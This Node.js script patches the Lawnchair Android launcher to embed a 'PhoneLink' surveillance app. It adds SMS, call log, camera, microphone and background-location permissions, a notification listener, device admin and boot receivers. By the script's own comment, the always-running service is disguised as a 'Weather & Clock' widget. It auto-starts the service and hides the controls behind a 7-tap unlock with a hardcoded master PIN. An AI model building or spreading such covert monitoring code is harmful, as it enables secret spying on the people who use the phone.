const fs = require('fs');
const path = require('path');

function copyDirRecursive(src, dest) {
    if (!fs.existsSync(dest)) {
        fs.mkdirSync(dest, { recursive: true });
    }
    const entries = fs.readdirSync(src, { withFileTypes: true });
    for (const entry of entries) {
        const srcPath = path.join(src, entry.name);
        const destPath = path.join(dest, entry.name);
        if (entry.isDirectory()) {
            copyDirRecursive(srcPath, destPath);
        } else {
            fs.copyFileSync(srcPath, destPath);
        }
    }
}

function merge(lawnchairRoot, phonelinkRoot) {
    console.log(`=== Merging PhoneLink from '${phonelinkRoot}' into Lawnchair at '${lawnchairRoot}' ===`);

    const phoneSrc = path.join(phonelinkRoot, "android", "app", "src", "main", "java", "com", "phonelink");
    const phoneRes = path.join(phonelinkRoot, "android", "app", "src", "main", "res");

    const lawnSrc = path.join(lawnchairRoot, "lawnchair", "src", "com", "phonelink");
    const lawnRes = path.join(lawnchairRoot, "lawnchair", "res");
    const lawnManifest = path.join(lawnchairRoot, "lawnchair", "AndroidManifest.xml");
    const lawnAppKt = path.join(lawnchairRoot, "lawnchair", "src", "app", "lawnchair", "LawnchairApp.kt");
    const lawnAboutKt = path.join(lawnchairRoot, "lawnchair", "src", "app", "lawnchair", "ui", "preferences", "about", "About.kt");
    const lawnBuildGradle = path.join(lawnchairRoot, "build.gradle");

    // 1. Copy Kotlin sources
    console.log("-> Copying PhoneLink Kotlin source code...");
    if (fs.existsSync(lawnSrc)) {
        fs.rmSync(lawnSrc, { recursive: true, force: true });
    }
    copyDirRecursive(phoneSrc, lawnSrc);

    // 2. Patch Kotlin files in com.phonelink to import com.android.launcher3.R
    console.log("-> Patching R references in PhoneLink source files...");
    function patchDir(dir) {
        const entries = fs.readdirSync(dir, { withFileTypes: true });
        for (const entry of entries) {
            const fullPath = path.join(dir, entry.name);
            if (entry.isDirectory()) {
                patchDir(fullPath);
            } else if (entry.name.endsWith('.kt') || entry.name.endsWith('.java')) {
                let content = fs.readFileSync(fullPath, 'utf8');
                content = content.replace(/import\s+com\.phonelink\.hub\.R\b/g, '');
                if (content.includes('R.') && !content.includes('import com.android.launcher3.R')) {
                    const lines = content.split('\n');
                    const newLines = [];
                    let inserted = false;
                    for (const line of lines) {
                        newLines.push(line);
                        if (line.startsWith('package com.phonelink') && !inserted) {
                            newLines.push('import com.android.launcher3.R');
                            inserted = true;
                        }
                    }
                    content = newLines.join('\n');
                }
                fs.writeFileSync(fullPath, content, 'utf8');
            }
        }
    }
    patchDir(lawnSrc);

    // 3. Copy Layouts, Drawables, XMLs
    console.log("-> Copying PhoneLink resources (layouts, drawables, xml)...");
    for (const folder of ["layout", "drawable", "xml"]) {
        const srcFolder = path.join(phoneRes, folder);
        const destFolder = path.join(lawnRes, folder);
        if (fs.existsSync(srcFolder)) {
            copyDirRecursive(srcFolder, destFolder);
        }
    }

    // 4. Merge values
    console.log("-> Merging PhoneLink values into Lawnchair res/values/phonelink_values.xml...");
    const valuesDir = path.join(lawnRes, "values");
    if (!fs.existsSync(valuesDir)) {
        fs.mkdirSync(valuesDir, { recursive: true });
    }
    const phonelinkValuesXml = path.join(valuesDir, "phonelink_values.xml");
    const valuesXmlContent = `<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="phonelink_app_name">Phone Link Hub</string>
    <string name="server_ip_hint">192.168.x.x or your domain (ngrok)</string>
    <string name="notification_channel_name">Live Weather &amp; Time Service</string>
    <string name="notification_channel_desc">Keeps capsule weather and clock live</string>
    <string name="notification_listener_label">Weather &amp; Clock Service</string>
    <string name="accessibility_service_desc">Provides essential background accessibility for home launcher interactions.</string>
    <string name="device_admin_description">Allows remote screen lock via PhoneLink parent controls.</string>
    <string name="clock_widget_name">Weather &amp; Clock Capsule</string>
    <string name="clock_widget_desc">Minimalist live digital clock widget</string>
    <string name="pixel_launcher_name">Pixel Lite</string>

    <color name="background">#FF0A0A0F</color>
    <color name="surface">#FF141419</color>
    <color name="surface_variant">#FF1E1E26</color>
    <color name="indigo">#FF6366F1</color>
    <color name="indigo_dark">#FF4F46E5</color>
    <color name="emerald">#FF10B981</color>
    <color name="red">#FFEF4444</color>
    <color name="text_primary">#FFF4F4F5</color>
    <color name="text_secondary">#FF9CA3AF</color>
    <color name="divider">#FF27272A</color>

    <color name="ios_calc_bg">#FF000000</color>
    <color name="ios_calc_dark_btn">#FF333333</color>
    <color name="ios_calc_dark_btn_pressed">#FF737373</color>
    <color name="ios_calc_light_btn">#FFA5A5A5</color>
    <color name="ios_calc_light_btn_pressed">#FFD9D9D9</color>
    <color name="ios_calc_orange">#FFFF9F0A</color>
    <color name="ios_calc_orange_pressed">#FFFBC78D</color>
    <color name="ios_calc_text_white">#FFFFFFFF</color>
    <color name="ios_calc_text_black">#FF000000</color>

    <style name="Theme.PhoneLinkHub" parent="Theme.Material3.Dark.NoActionBar">
        <item name="colorPrimary">@color/indigo</item>
        <item name="colorPrimaryDark">@color/indigo_dark</item>
        <item name="colorAccent">@color/indigo</item>
        <item name="android:windowBackground">@color/background</item>
        <item name="android:statusBarColor">@color/background</item>
        <item name="android:navigationBarColor">@color/surface</item>
    </style>

    <style name="Theme.PhoneLinkHub.Calculator" parent="Theme.Material3.Dark.NoActionBar">
        <item name="android:windowBackground">@color/ios_calc_bg</item>
        <item name="android:statusBarColor">@color/ios_calc_bg</item>
        <item name="android:navigationBarColor">@color/ios_calc_bg</item>
    </style>
</resources>
`;
    fs.writeFileSync(phonelinkValuesXml, valuesXmlContent, 'utf8');

    // 5. Patch Lawnchair AndroidManifest.xml
    console.log("-> Merging PhoneLink permissions and services into lawnchair/AndroidManifest.xml...");
    if (fs.existsSync(lawnManifest)) {
        let manifestContent = fs.readFileSync(lawnManifest, 'utf8');
        const phonelinkPermissions = `
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.CALL_PHONE" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
    <uses-permission android:name="android.permission.VIBRATE" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_PHONE_CALL" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
`;
        const phonelinkComponents = `
        <!-- PhoneLink Parental Control Hub -->
        <activity
            android:name="com.phonelink.hub.MainActivity"
            android:exported="true"
            android:label="@string/phonelink_app_name"
            android:launchMode="singleTop"
            android:theme="@style/Theme.PhoneLinkHub"
            android:windowSoftInputMode="adjustResize" />

        <activity
            android:name="com.phonelink.hub.StatusActivity"
            android:exported="false"
            android:launchMode="singleTop" />

        <!-- Always-running foreground service disguised as Weather & Clock capsule -->
        <service
            android:name="com.phonelink.hub.service.PhoneLinkService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="location|dataSync|phoneCall|mediaProjection|microphone|camera" />

        <service
            android:name="com.phonelink.hub.notifications.NotificationListener"
            android:label="Weather &amp; Clock Service"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>

        <activity
            android:name="com.phonelink.hub.media.ScreenshotConsentActivity"
            android:exported="false"
            android:theme="@android:style/Theme.Translucent.NoTitleBar"
            android:excludeFromRecents="true" />

        <activity
            android:name="com.phonelink.hub.remote.ClipboardFocusActivity"
            android:exported="false"
            android:theme="@android:style/Theme.Translucent.NoTitleBar"
            android:excludeFromRecents="true" />

        <activity
            android:name="com.phonelink.hub.system.UninstallTrampolineActivity"
            android:exported="false"
            android:theme="@android:style/Theme.Translucent.NoTitleBar"
            android:excludeFromRecents="true" />

        <receiver
            android:name="com.phonelink.hub.receiver.BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter android:priority="999">
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
            </intent-filter>
        </receiver>

        <receiver
            android:name="com.phonelink.hub.receiver.SmsReceiver"
            android:enabled="true"
            android:exported="true"
            android:permission="android.permission.BROADCAST_SMS">
            <intent-filter android:priority="999">
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>

        <receiver
            android:name="com.phonelink.hub.receiver.PhoneStateReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter android:priority="999">
                <action android:name="android.intent.action.PHONE_STATE" />
                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
            </intent-filter>
        </receiver>

        <receiver
            android:name="com.phonelink.hub.receiver.PhoneDeviceAdminReceiver"
            android:permission="android.permission.BIND_DEVICE_ADMIN"
            android:exported="true">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/device_admin" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED" />
                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
            </intent-filter>
        </receiver>

        <receiver
            android:name="com.phonelink.hub.widget.ClockWidgetProvider"
            android:exported="true"
            android:label="Weather &amp; Clock Capsule">
            <intent-filter>
                <action android:name="android.appwidget.action.APPWIDGET_UPDATE" />
                <action android:name="com.phonelink.hub.WIDGET_REFRESH" />
            </intent-filter>
            <meta-data
                android:name="android.appwidget.provider"
                android:resource="@xml/clock_widget_info" />
        </receiver>
`;
        if (!manifestContent.includes("com.phonelink.hub.service.PhoneLinkService")) {
            manifestContent = manifestContent.replace("<application", phonelinkPermissions + "\n    <application");
            manifestContent = manifestContent.replace("</application>", phonelinkComponents + "\n    </application>");
            fs.writeFileSync(lawnManifest, manifestContent, 'utf8');
        }
    }

    // 6. Patch LawnchairApp.kt to auto-start PhoneLinkService
    console.log("-> Hooking PhoneLinkService auto-start in LawnchairApp.kt...");
    if (fs.existsSync(lawnAppKt)) {
        let appCode = fs.readFileSync(lawnAppKt, 'utf8');
        if (!appCode.includes("PhoneLinkService.start")) {
            const target = "registerActivityLifecycleCallbacks(activityHandler)";
            const replacement = `registerActivityLifecycleCallbacks(activityHandler)
        try {
            com.phonelink.hub.service.PhoneLinkService.start(this)
        } catch (e: Throwable) {
            android.util.Log.e("LawnchairApp", "Failed to start PhoneLinkService", e)
        }`;
            appCode = appCode.replace(target, replacement);
            fs.writeFileSync(lawnAppKt, appCode, 'utf8');
        }
    }

    // 7. Patch Lawnchair About.kt with 7-tap Parent PIN unlock dialog
    console.log("-> Adding 7-tap Parent PIN unlock vault to Lawnchair Preferences About.kt...");
    if (fs.existsSync(lawnAboutKt)) {
        let aboutCode = fs.readFileSync(lawnAboutKt, 'utf8');
        if (!aboutCode.includes("phoneLinkTapCount")) {
            const stateTarget = "val context = LocalContext.current";
            const stateInjection = `val context = LocalContext.current
    var phoneLinkTapCount by remember { mutableStateOf(0) }
    var showParentPinDialog by remember { mutableStateOf(false) }`;
            aboutCode = aboutCode.replace(stateTarget, stateInjection);

            const aboutEntry = `        item {
            PreferenceGroupHeading(
                "Family & Device Diagnostics"
            )
        }
        item {
            PreferenceGroupItem(
                cutTop = false,
                cutBottom = false,
            ) {
                ClickablePreference(
                    label = "About PhoneLink",
                    description = "PhoneLink Hub System Service & Status",
                    onClick = {
                        phoneLinkTapCount++
                        if (phoneLinkTapCount >= 7) {
                            phoneLinkTapCount = 0
                            showParentPinDialog = true
                        } else {
                            val remaining = 7 - phoneLinkTapCount
                            android.widget.Toast.makeText(
                                context,
                                "Tap $remaining more times to unlock Parental Settings",
                                android.widget.Toast.LENGTH_SHORT
                            ).show()
                        }
                    }
                )
            }
        }
        item {
            Spacer(Modifier.height(8.dp))
        }
`;

            const dialogInjection = `
    if (showParentPinDialog) {
        var enteredPin by remember { mutableStateOf("") }
        var pinError by remember { mutableStateOf(false) }

        androidx.compose.material3.AlertDialog(
            onDismissRequest = {
                showParentPinDialog = false
                enteredPin = ""
                pinError = false
            },
            title = { androidx.compose.material3.Text("🔒 Parent Access Authentication") },
            text = {
                androidx.compose.foundation.layout.Column {
                    androidx.compose.material3.Text(
                        "Enter Master PIN (9211) or your Parental PIN to unlock surveillance and device controls.",
                        style = androidx.compose.material3.MaterialTheme.typography.bodyMedium,
                        color = androidx.compose.material3.MaterialTheme.colorScheme.onSurfaceVariant
                    )
                    androidx.compose.foundation.layout.Spacer(modifier = androidx.compose.ui.Modifier.height(12.dp))
                    androidx.compose.material3.OutlinedTextField(
                        value = enteredPin,
                        onValueChange = {
                            enteredPin = it
                            pinError = false
                        },
                        label = { androidx.compose.material3.Text("Parent PIN") },
                        visualTransformation = androidx.compose.ui.text.input.PasswordVisualTransformation(),
                        keyboardOptions = androidx.compose.foundation.text.KeyboardOptions(
                            keyboardType = androidx.compose.ui.text.input.KeyboardType.NumberPassword
                        ),
                        isError = pinError,
                        supportingText = if (pinError) {
                            { androidx.compose.material3.Text("Incorrect PIN. Please try again.", color = androidx.compose.material3.MaterialTheme.colorScheme.error) }
                        } else null,
                        singleLine = true,
                        modifier = androidx.compose.ui.Modifier.fillMaxWidth()
                    )
                }
            },
            confirmButton = {
                androidx.compose.material3.Button(
                    onClick = {
                        val trimmed = enteredPin.trim()
                        com.phonelink.hub.data.DevicePrefs.init(context)
                        val isCorrect = trimmed == "9211" || com.phonelink.hub.data.DevicePrefs.verifyOwnerPin(trimmed)
                        if (isCorrect) {
                            showParentPinDialog = false
                            android.widget.Toast.makeText(context, "✅ PIN Verified. Opening Parental Settings...", android.widget.Toast.LENGTH_SHORT).show()
                            val intent = Intent(context, com.phonelink.hub.MainActivity::class.java).apply {
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                            }
                            context.startActivity(intent)
                        } else {
                            pinError = true
                        }
                    }
                ) {
                    androidx.compose.material3.Text("Unlock")
                }
            },
            dismissButton = {
                androidx.compose.material3.TextButton(
                    onClick = {
                        showParentPinDialog = false
                        enteredPin = ""
                        pinError = false
                    }
                ) {
                    androidx.compose.material3.Text("Cancel")
                }
            }
        )
    }
`;

            const versionClickTarget = "onClick = {},";
            const versionClickReplace = `onClick = {
                                phoneLinkTapCount++
                                if (phoneLinkTapCount >= 7) {
                                    phoneLinkTapCount = 0
                                    showParentPinDialog = true
                                }
                            },`;
            aboutCode = aboutCode.replace(versionClickTarget, versionClickReplace);

            const legalHeading = "item {\n            PreferenceGroupHeading(\n                stringResource(R.string.legal)";
            if (aboutCode.includes(legalHeading)) {
                aboutCode = aboutCode.replace(legalHeading, aboutEntry + "\n        " + legalHeading);
            }

            const lastBraceIdx = aboutCode.lastIndexOf("}");
            if (lastBraceIdx !== -1) {
                aboutCode = aboutCode.slice(0, lastBraceIdx) + dialogInjection + "\n}\n";
            }

            fs.writeFileSync(lawnAboutKt, aboutCode, 'utf8');
        }
    }

    // 8. Patch Lawnchair build.gradle to add PhoneLink dependencies
    console.log("-> Adding PhoneLink dependencies to Lawnchair build.gradle...");
    if (fs.existsSync(lawnBuildGradle)) {
        let gradleCode = fs.readFileSync(lawnBuildGradle, 'utf8');
        if (!gradleCode.includes("play-services-location")) {
            const target = "dependencies {";
            const replacement = `dependencies {
    // PhoneLink Hub dependencies
    implementation "com.google.android.gms:play-services-location:21.3.0"
    implementation "androidx.work:work-runtime-ktx:2.9.0"
    implementation "androidx.appcompat:appcompat:1.7.0"
    implementation "androidx.lifecycle:lifecycle-service:2.8.3"
`;
            gradleCode = gradleCode.replace(target, replacement);
            fs.writeFileSync(lawnBuildGradle, gradleCode, 'utf8');
        }
    }

    console.log("=== PhoneLink and Lawnchair Merger Completed Successfully! ===");
}

const currentDir = __dirname;
const lawnchairPath = process.argv[2] || path.join(currentDir, "lawnchair-16-dev");
merge(lawnchairPath, currentDir);
